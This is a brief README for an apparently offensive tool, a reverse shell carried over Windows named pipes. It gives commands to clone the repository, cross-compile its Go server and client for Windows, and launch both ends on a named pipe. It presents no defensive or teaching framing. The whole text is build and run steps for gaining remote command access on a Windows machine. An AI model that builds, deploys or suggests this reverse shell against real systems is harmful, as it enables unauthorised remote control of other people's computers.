## reverse shell over named pipe

### compile under linux/bash
`git clone https://github.com/r0lh/named_pipe_reverse_shell`

`cd named_pipe_reverse_shell`

`GOOS=windows GOARCH=amd64 go build ./cmd/server.go`

`GOOS=windows GOARCH=amd64 go build ./cmd/client.go`

### usage
`.\server.exe \\.\pipe\yourpipename`

`.\client.exe \\.\pipe\yourpipename`

![named_pipe](https://github.com/user-attachments/assets/9add9efb-1a02-4835-a170-9e41f986da7a)
